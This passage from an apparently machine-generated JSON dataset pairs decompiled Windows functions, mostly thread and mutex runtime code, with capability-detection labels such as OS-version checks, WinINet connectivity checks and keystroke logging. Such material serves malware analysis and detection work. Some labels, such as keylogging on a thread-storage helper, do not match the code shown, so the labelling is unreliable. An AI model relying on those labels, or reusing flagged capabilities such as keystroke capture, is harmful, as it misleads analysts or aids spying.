0) {\n        iVar3 = uVar6 << 4;\n        do {\n            if (*0x4349b0 == NULL) {\n                *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n            }\n            uVar2 = *(**0x4349b0 + -8 + iVar3);\n            if (*0x434998 == NULL) {\n                *0x434998 = fcn.00410a00(\"idListNextId_shmem\", 8, 0);\n            }\n            if (uVar2 < **0x434998 || uVar2 == **0x434998) goto code_r0x0040c222;\n            iVar3 = iVar3 + -0x10;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n        iVar3 = 0;\ncode_r0x0040c222:\n        if (*0x4349a8 == NULL) {\n            *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n        }\n        if (**0x4349a8 != uVar6) {\n            if (*0x4349a8 == NULL) {\n                *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n            }\n            if (*0x4349b0 == NULL) {\n                *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n            }\n            sub.msvcrt.dll_memmove(**0x4349b0 + (uVar6 + 1) * 0x10, **0x4349b0 + iVar3);\n        }\n    }\n    if (*0x4349b0 == NULL) {\n        *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n    }\n    iVar1 = **0x4349b0;\n    if (*0x434998 == NULL) {\n        *0x434998 = fcn.00410a00(\"idListNextId_shmem\", 8, 0);\n    }\n    *(iVar3 + iVar1 + 8) = **0x434998;\n    if (*0x4349b0 == NULL) {\n        *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n    }\n    *(**0x4349b0 + iVar3) = arg1;\n    if (*0x4349a8 == NULL) {\n        *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n    }\n    **0x4349a8 = **0x4349a8 + 1;\n    if (*0x434998 == NULL) {\n        *0x434998 = fcn.00410a00(\"idListNextId_shmem\", 8, 0);\n    }\n    return **0x434998;\n}\n",
        "token_count": 1919
    },
    "0040c760": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.0040c760(ulong *arg1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    bool bVar3;\n    int32_t **ppiVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint64_t *puVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong uVar11;\n    uint64_t uVar12;\n    char *arg1_00;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    ulong *puVar16;\n    ulong *puVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    bool bVar20;\n    ulong auStack184 [5];\n    ulong uStack144;\n    ulong uStack136;\n    uint64_t auStack128 [4];\n    \n    if (*0x4349b8 == NULL) {\n        *0x4349b8 = fcn.00410a00(\"mtx_pthr_locked_shmem\", 8, 0x40b9b0);\n    }\n    fcn.00410710(*0x4349b8);\n    uVar13 = arg1[0x3b];\n    if (uVar13 != 0) {\n        if (*0x4349a8 == NULL) {\n            *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n        }\n        if (**0x4349a8 != 0) {\n            if (*0x4349a8 == NULL) {\n                *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n            }\n            uVar15 = 0;\n            uVar12 = **0x4349a8 - 1;\n            do {\n                uVar14 = uVar15 + uVar12 >> 1;\n                if (*0x4349b0 == NULL) {\n                    *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                    if (uVar13 == *(**0x4349b0 + 8 + uVar14 * 0x10)) goto code_r0x0040c96b;\n                    if (*0x4349b0 == NULL) {\n                        *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                    }\n                }\n                else if (uVar13 == *(**0x4349b0 + 8 + uVar14 * 0x10)) {\ncode_r0x0040c96b:\n                    if (*0x4349b0 == NULL) {\n                        *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                    }\n                    uVar14 = uVar14 + 1;\n                    if (*0x4349a8 == NULL) {\n                        *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n                        if (uVar14 < **0x4349a8) {\n                            if (*0x4349a8 == NULL) {\n                                *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n                            }\n                            goto code_r0x0040cb24;\n                        }\n                    }\n                    else if (uVar14 < **0x4349a8) {\ncode_r0x0040cb24:\n                        if (*0x4349b0 == NULL) {\n                            *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                        }\n                        sub.msvcrt.dll_memmove(**0x4349b0 + -0x10 + uVar14 * 0x10, **0x4349b0 + uVar14 * 0x10);\n                    }\n                    puVar8 = *0x4349a8;\n                    if (*0x4349a8 == NULL) {\n                        puVar8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n                        *0x4349a8 = puVar8;\n                        *puVar8 = *puVar8 - 1;\n                        if (puVar8 == NULL) {\n                            puVar8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n                            *0x4349a8 = puVar8;\n                        }\n                    }\n                    else {\n                        **0x4349a8 = **0x4349a8 - 1;\n                    }\n                    if (*puVar8 == 0) {\n                        if (*0x4349b0 == NULL) {\n                            *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                        }\n                        sub.msvcrt.dll_free(**0x4349b0);\n                        if (*0x4349a8 == NULL) {\n                            *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n                        }\n                        puVar8 = *0x4349a8;\n                        if (*0x4349a0 == NULL) {\n                            *0x4349a0 = fcn.00410a00(\"idListMax_shmem\", 8, 0);\n                        }\n                        **0x4349a0 = 0;\n                        *puVar8 = 0;\n                    }\n                    break;\n                }\n                if (uVar13 < *(**0x4349b0 + 8 + uVar14 * 0x10)) {\n                    if (uVar15 == uVar14) break;\n                    uVar12 = uVar14 - 1;\n                }\n                else {\n                    uVar15 = uVar14 + 1;\n                }\n            } while (uVar15 <= uVar12);\n        }\n    }\n    if (arg1[10] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    if (arg1[0xb] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    uVar13 = 0x1e0;\n    bVar3 = false;\n    iVar6 = 0x1e0;\n    bVar20 = false;\n    if ((arg1 & 1) == 0) {\n        puVar16 = arg1;\n        if ((arg1 & 2) != 0) goto code_r0x0040ca10;\ncode_r0x0040c7cc:\n        uVar19 = uVar13;\n    }\n    else {\n        puVar16 = arg1 + 1;\n        *arg1 = 0;\n        uVar13 = 0x1df;\n        bVar3 = true;\n        iVar6 = 0x1df;\n        bVar20 = true;\n        if ((puVar16 & 2) == 0) goto code_r0x0040c7cc;\ncode_r0x0040ca10:\n        uVar19 = iVar6 - 2;\n        uVar13 = uVar19;\n        *puVar16 = 0;\n        puVar16 = puVar16 + 2;\n        bVar3 = bVar20;\n    }\n    if ((puVar16 & 4) != 0) {\n        *puVar16 = 0;\n        uVar13 = uVar19 - 4;\n        puVar16 = puVar16 + 4;\n    }\n    for (uVar12 = uVar13 >> 3; uVar12 != 0; uVar12 = uVar12 - 1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    if ((uVar13 & 4) != 0) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 4;\n    }\n    puVar17 = puVar16;\n    if ((uVar13 & 2) != 0) {\n        puVar17 = puVar16 + 2;\n        *puVar16 = 0;\n    }\n    if (bVar3) {\n        *puVar17 = 0;\n    }\n    if (*0x4349c0 == NULL) {\n        *0x4349c0 = fcn.00410a00(\"pthr_last_shmem\", 8, 0);\n    }\n    if (**0x4349c0 == 0) {\n        if (*0x4349c8 == NULL) {\n            *0x4349c8 = fcn.00410a00(\"pthr_root_shmem\", 8, 0);\n        }\n        puVar16 = *0x4349c8;\n        if (*0x4349c0 == NULL) {\n            *0x4349c0 = fcn.00410a00(\"pthr_last_shmem\", 8, 0);\n        }\n        **0x4349c0 = arg1;\n        *puVar16 = arg1;\n    }\n    else {\n        if (*0x4349c0 == NULL) {\n            *0x4349c0 = fcn.00410a00(\"pthr_last_shmem\", 8, 0);\n        }\n        *(**0x4349c0 + 0x1d0) = arg1;\n    }\n    if (*0x4349b8 == NULL) {\n        *0x4349b8 = fcn.00410a00(\"mtx_pthr_locked_shmem\", 8, 0x40b9b0);\n    }\n    ppiVar4 = *0x4349b8;\n    uVar13 = fcn.0040fb90(*0x4349b8);\n    if (uVar13 != 0) {\n        return uVar13;\n    }\n    uStack136 = *ppiVar4;\n    if (uStack136[2] == 0) {\n        uVar19 = 1;\n        if (uStack136[5] == 0) goto code_r0x0040fec0;\n        goto code_r0x00410130;\n    }\n    iVar6 = uStack136[5];\n    if (iVar6 != 0) {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar6 == iVar7) {\n            if (uStack136[2] == 2) {\n                LOCK();\n                piVar1 = uStack136 + 3;\n                iVar6 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                if (iVar6 == 1) goto code_r0x00410130;\ncode_r0x00410152:\n                uVar19 = 0;\n            }\n            else {\ncode_r0x00410130:\n                uStack136[5] = 0;\n                if (*(uStack136 + 6) == 0) goto code_r0x00410152;\n                iVar6 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*(uStack136 + 6), 1, 0);\n                if (iVar6 != 0) goto code_r0x00410152;\n                iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n                uVar19 = 1;\n                uStack136[5] = iVar6;\n            }\n            uStack136 = *ppiVar4;\n            goto code_r0x0040fec0;\n        }\n        uStack136 = *ppiVar4;\n    }\n    uVar19 = 1;\ncode_r0x0040fec0:\n    auStack128[0] = uVar19;\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    iVar9 = *0x434a38;\n    if ((*uStack136 == -0x454e0ff3) && (0 < uStack136[1])) {\n        bVar20 = *0x434a38 == 0;\n        uStack136[1] = uStack136[1] + -1;\n        if (bVar20) {\n            *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n            fcn.00410d10(*0x434a38);\n            return auStack128[0];\n        }\n        fcn.00410d10(iVar9);\n        return auStack128[0];\n    }\n    iVar9 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf(iVar9 + 0x60, 0x42f208, \"(m_->valid == LIFE_MUTEX) && (m_->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1_00 = \"mutex_global_shmem\";\n    auStack184[0] = 0x410a26;\n    iVar6 = sub.msvcrt.dll_strlen();\n    auStack184[0] = 0x410a3e;\n    iVar10 = fcn.0040b810(arg1_00);\n    iVar10 = -iVar10;\n    iVar9 = &uStack144 + iVar10;\n    *(&uStack144 + iVar10) = 0x656d68732d636367;\n    *(&uStack136 + iVar10) = 0x64742d6d;\n    *(&uStack136 + iVar10 + 4) = 0x326d;\n    uVar19 = iVar6 + 0x50;\n    *(&uStack136 + iVar10 + 6) = 0x2d;\n    *(auStack184 + iVar10) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&uStack136 + iVar10 + 7, \"mutex_global_shmem\", iVar6);\n    puVar16 = auStack128 + iVar6 + iVar10;\n    *puVar16 = 0x6161616161616161;\n    puVar16[1] = 0x6161616161616161;\n    puVar16[2] = 0x6161616161616161;\n    puVar16[3] = 0x6161616161616161;\n    puVar16[4] = 0x6161616161616161;\n    puVar16[5] = 0x6161616161616161;\n    puVar16[6] = 0x6161616161616161;\n    puVar16[7] = 0x6161616161616161;\n    *(&uStack144 + uVar19 + iVar10) = 0;\n    *(&uStack144 + (iVar6 + 0xf) + iVar10) = 0;\n    *(auStack184 + iVar10) = 0x410ace;\n    uVar11 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    *(&uStack144 + (iVar6 + 0xf) + iVar10) = 0x2d;\n    *(auStack184 + iVar10) = 0x410ae4;\n    iVar7 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar11, 0xffffffff);\n    if (iVar7 != 0) {\n        pcVar2 = swi(3);\n        uVar13 = (*pcVar2)();\n        return uVar13;\n    }\n    *(auStack184 + iVar10) = 0x410af2;\n    uVar5 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar5 == 0) {\n        *(auStack184 + iVar10) = 0x410b07;\n        uVar12 = sub.msvcrt.dll_malloc(0x10);\n        uVar13 = 0x40;\n        do {\n            if ((uVar12 >> (uVar13 & 0x3f) & 1) != 0) {\n                *(iVar9 + (uVar19 - uVar13)) = 0x41;\n            }\n            uVar18 = uVar13 - 1;\n            uVar13 = uVar18;\n        } while (uVar18 != 0);\n        *(auStack184 + iVar10) = 0x410b33;\n        uVar5 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar5 == 0) {\n            pcVar2 = swi(3);\n            uVar13 = (*pcVar2)();\n            return uVar13;\n        }\n        *(auStack184 + iVar10) = 0x410b49;\n        uVar13 = fcn.00410980(uVar5, iVar9, uVar19, iVar6 + 0x10);\n        if (uVar13 == uVar12) {\n            *(auStack184 + iVar10) = 0x410ba6;\n            sub.msvcrt.dll_memset(uVar12, 0, 0x10);\n            *(auStack184 + iVar10) = 0x410bb1;\n            (*0x40fb30)(uVar12);\n        }\n        else {\n            *(auStack184 + iVar10) = 0x410b59;\n            sub.msvcrt.dll_free(uVar12);\n        }\n    }\n    else {\n        *(auStack184 + iVar10) = 0x410b94;\n        uVar13 = fcn.00410980(uVar5, iVar9, uVar19, iVar6 + 0x10);\n    }\n    *(auStack184 + iVar10) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar11);\n    *(auStack184 + iVar10) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar11);\n    return uVar13;\n}\n",
        "token_count": 3987
    },
    "00410100": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint64_t fcn.00410100(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    uchar *arg2;\n    ulong *puVar2;\n    code *pcVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    ulong uVar9;\n    uint64_t uVar10;\n    char *arg1_00;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    ulong auStack184 [5];\n    ulong uStack144;\n    ulong uStack136;\n    uint64_t auStack128 [2];\n    \n    uVar8 = fcn.0040fb90(arg1);\n    if (uVar8 != 0) {\n        return uVar8;\n    }\n    uStack136 = *arg1;\n    if (uStack136[2] == 0) {\n        uVar12 = 1;\n        if (uStack136[5] == 0) goto code_r0x0040fec0;\n        goto code_r0x00410130;\n    }\n    iVar5 = uStack136[5];\n    if (iVar5 != 0) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar5 == iVar6) {\n            if (uStack136[2] == 2) {\n                LOCK();\n                piVar1 = uStack136 + 3;\n                iVar5 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                if (iVar5 == 1) goto code_r0x00410130;\ncode_r0x00410152:\n                uVar12 = 0;\n            }\n            else {\ncode_r0x00410130:\n                uStack136[5] = 0;\n                if (*(uStack136 + 6) == 0) goto code_r0x00410152;\n                iVar5 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*(uStack136 + 6), 1, 0);\n                if (iVar5 != 0) goto code_r0x00410152;\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n                uVar12 = 1;\n                uStack136[5] = iVar5;\n            }\n            uStack136 = *arg1;\n            goto code_r0x0040fec0;\n        }\n        uStack136 = *arg1;\n    }\n    uVar12 = 1;\ncode_r0x0040fec0:\n    auStack128[0] = uVar12;\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    iVar7 = *0x434a38;\n    if ((*uStack136 == -0x454e0ff3) && (0 < uStack136[1])) {\n        bVar13 = *0x434a38 != 0;\n        uStack136[1] = uStack136[1] + -1;\n        if (bVar13) {\n            fcn.00410d10(iVar7);\n            return auStack128[0];\n        }\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n        fcn.00410d10(*0x434a38);\n        return auStack128[0];\n    }\n    iVar7 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf(iVar7 + 0x60, 0x42f208, \"(m_->valid == LIFE_MUTEX) && (m_->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1_00 = \"mutex_global_shmem\";\n    auStack184[0] = 0x410a26;\n    iVar5 = sub.msvcrt.dll_strlen();\n    auStack184[0] = 0x410a3e;\n    iVar7 = fcn.0040b810(arg1_00);\n    iVar7 = -iVar7;\n    arg2 = &stack0xffffffffffffff70 + iVar7;\n    *(&stack0xffffffffffffff70 + iVar7) = 0x656d68732d636367;\n    *(&stack0xffffffffffffff78 + iVar7) = 0x64742d6d;\n    *(&stack0xffffffffffffff7c + iVar7) = 0x326d;\n    uVar12 = iVar5 + 0x50;\n    (&stack0xffffffffffffff7e)[iVar7] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&stack0xffffffffffffff7f + iVar7, \"mutex_global_shmem\", iVar5);\n    puVar2 = &stack0xffffffffffffff80 + iVar5 + iVar7;\n    *puVar2 = 0x6161616161616161;\n    puVar2[1] = 0x6161616161616161;\n    puVar2[2] = 0x6161616161616161;\n    puVar2[3] = 0x6161616161616161;\n    puVar2[4] = 0x6161616161616161;\n    puVar2[5] = 0x6161616161616161;\n    puVar2[6] = 0x6161616161616161;\n    puVar2[7] = 0x6161616161616161;\n    (&stack0xffffffffffffff70)[uVar12 + iVar7] = 0;\n    (&stack0xffffffffffffff70)[(iVar5 + 0xf) + iVar7] = 0;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410ace;\n    uVar9 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    (&stack0xffffffffffffff70)[(iVar5 + 0xf) + iVar7] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410ae4;\n    iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar9, 0xffffffff);\n    if (iVar6 != 0) {\n        pcVar3 = swi(3);\n        uVar8 = (*pcVar3)();\n        return uVar8;\n    }\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410af2;\n    uVar4 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar4 == 0) {\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b07;\n        uVar10 = sub.msvcrt.dll_malloc(0x10);\n        uVar8 = 0x40;\n        do {\n            if ((uVar10 >> (uVar8 & 0x3f) & 1) != 0) {\n                arg2[uVar12 - uVar8] = 0x41;\n            }\n            uVar11 = uVar8 - 1;\n            uVar8 = uVar11;\n        } while (uVar11 != 0);\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b33;\n        uVar4 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar4 == 0) {\n            pcVar3 = swi(3);\n            uVar8 = (*pcVar3)();\n            return uVar8;\n        }\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b49;\n        uVar8 = fcn.00410980(uVar4, arg2, uVar12, iVar5 + 0x10);\n        if (uVar8 == uVar10) {\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410ba6;\n            sub.msvcrt.dll_memset(uVar10, 0, 0x10);\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410bb1;\n            (*0x40fb30)(uVar10);\n        }\n        else {\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410b59;\n            sub.msvcrt.dll_free(uVar10);\n        }\n    }\n    else {\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b94;\n        uVar8 = fcn.00410980(uVar4, arg2, uVar12, iVar5 + 0x10);\n    }\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar9);\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar9);\n    return uVar8;\n}\n",
        "token_count": 2026
    },
    "0040ccd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.0040ccd0(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    int64_t iVar2;\n    \n    arg1_00 = fcn.0040bc10(arg1);\n    fcn.00410710(arg1_00 + 8);\n    iVar1 = *arg1;\n    if (iVar1 == 0) {\n        fcn.0040c6e0();\n        *arg1 = 1;\n    }\n    else if (iVar1 != 1) {\n        iVar2 = (*_sym.imp.msvcrt.dll___iob_func)();\n        sub.msvcrt.dll_fprintf(iVar2 + 0x60, \" once %p is %d\\n\", arg1, iVar1);\n    }\n    fcn.00410100(arg1_00 + 8);\n    fcn.0040bd90(arg1_00);\n    return 0;\n}\n",
        "token_count": 207
    },
    "0040cd40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00410bab)\n\nuint64_t fcn.0040cd40(void)\n\n{\n    uchar *arg2;\n    ulong *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint64_t uVar7;\n    ulong uVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    char *arg1;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    ulong auStack216 [5];\n    ulong uStack176;\n    ulong uStack168;\n    uint64_t auStack160 [2];\n    \n    if (*0x4349f0 == NULL) {\n        *0x4349f0 = fcn.00410a00(\"_pthread_tls_once_shmem\", 4, 0);\n    }\n    if (**0x4349f0 != 1) {\n        fcn.0040ccd0(*0x4349f0);\n    }\n    if (*0x4349e8 == NULL) {\n        *0x4349e8 = fcn.00410a00(\"_pthread_tls_shmem\", 4, 0x40b990);\n    }\n    uVar7 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(**0x4349e8);\n    if (((uVar7 != 0) || (auStack160[0] = fcn.0040c540(),  *0x436050 == 0)) || (auStack160[0] == 0)) {\n        return uVar7;\n    }\n    *(auStack160[0] + 0x44) = 1;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    *(auStack160[0] + 0x70) = uVar4;\n    uVar8 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n    *(auStack160[0] + 0x30) = uVar8;\n    uStack168 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n    *(auStack160[0] + 0x38) = 0xffffffffffffffff;\n    *(auStack160[0] + 0x60) = 0;\n    *(auStack160[0] + 0x68) = 0x1feedbab1;\n    *(auStack160[0] + 0xb8) = 0;\n    *(auStack160[0] + 0x28) = 0;\n    (*uStack168)();\n    auStack160[1] = (*_sym.imp.KERNEL32.dll_GetCurrentThread)();\n    uVar8 = (*uStack168)();\n    iVar5 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar8, auStack160[1]);\n    if (iVar5 != 0) {\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetThreadPriority)(*(auStack160[0] + 0x28));\n        *(auStack160[0] + 0xc0) = uVar4;\n        *(auStack160[0] + 0xbc) = 0;\n        *(auStack160[0] + 0x40) = *(auStack160[0] + 0x40) & 0xcf | 0x10;\n        if (*0x4349e8 == NULL) {\n            *0x4349e8 = fcn.00410a00(\"_pthread_tls_shmem\", 4, 0x40b990);\n        }\n        iVar5 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(**0x4349e8, auStack160[0]);\n        if (iVar5 != 0) {\n            return auStack160[0];\n        }\n    }\n    sub.msvcrt.dll_abort();\n    arg1 = \"_pthread_key_dest_shmem\";\n    auStack216[0] = 0x410a26;\n    iVar5 = sub.msvcrt.dll_strlen();\n    auStack216[0] = 0x410a3e;\n    iVar9 = fcn.0040b810(arg1);\n    iVar9 = -iVar9;\n    arg2 = &stack0xffffffffffffff50 + iVar9;\n    *(&stack0xffffffffffffff50 + iVar9) = 0x656d68732d636367;\n    *(&stack0xffffffffffffff58 + iVar9) = 0x64742d6d;\n    *(&stack0xffffffffffffff5c + iVar9) = 0x326d;\n    uVar12 = iVar5 + 0x50;\n    (&stack0xffffffffffffff5e)[iVar9] = 0x2d;\n    *(&stack0xffffffffffffff28 + iVar9) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&stack0xffffffffffffff5f + iVar9, \"_pthread_key_dest_shmem\", iVar5);\n    puVar1 = &stack0xffffffffffffff60 + iVar5 + iVar9;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    (&stack0xffffffffffffff50)[uVar12 + iVar9] = 0;\n    (&stack0xffffffffffffff50)[(iVar5 + 0xf) + iVar9] = 0;\n    *(&stack0xffffffffffffff28 + iVar9) = 0x410ace;\n    uVar8 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    (&stack0xffffffffffffff50)[(iVar5 + 0xf) + iVar9] = 0x2d;\n    *(&stack0xffffffffffffff28 + iVar9) = 0x410ae4;\n    iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar8, 0xffffffff);\n    if (iVar6 != 0) {\n        pcVar2 = swi(3);\n        uVar7 = (*pcVar2)();\n        return uVar7;\n    }\n    *(&stack0xffffffffffffff28 + iVar9) = 0x410af2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(&stack0xffffffffffffff28 + iVar9) = 0x410b07;\n        uVar10 = sub.msvcrt.dll_malloc(8);\n        uVar7 = 0x40;\n        do {\n            if ((uVar10 >> (uVar7 & 0x3f) & 1) != 0) {\n                arg2[uVar12 - uVar7] = 0x41;\n            }\n            uVar11 = uVar7 - 1;\n            uVar7 = uVar11;\n        } while (uVar11 != 0);\n        *(&stack0xffffffffffffff28 + iVar9) = 0x410b33;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            uVar7 = (*pcVar2)();\n            return uVar7;\n        }\n        *(&stack0xffffffffffffff28 + iVar9) = 0x410b49;\n        uVar7 = fcn.00410980(uVar3, arg2, uVar12, iVar5 + 0x10);\n        if (uVar7 == uVar10) {\n            *(&stack0xffffffffffffff28 + iVar9) = 0x410ba6;\n            sub.msvcrt.dll_memset(uVar10, 0, 8);\n        }\n        else {\n            *(&stack0xffffffffffffff28 + iVar9) = 0x410b59;\n            sub.msvcrt.dll_free(uVar10);\n        }\n    }\n    else {\n        *(&stack0xffffffffffffff28 + iVar9) = 0x410b94;\n        uVar7 = fcn.00410980(uVar3, arg2, uVar12, iVar5 + 0x10);\n    }\n    *(&stack0xffffffffffffff28 + iVar9) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar8);\n    *(&stack0xffffffffffffff28 + iVar9) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar8);\n    return uVar7;\n}\n",
        "token_count": 1976
    },
    "0040d190": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
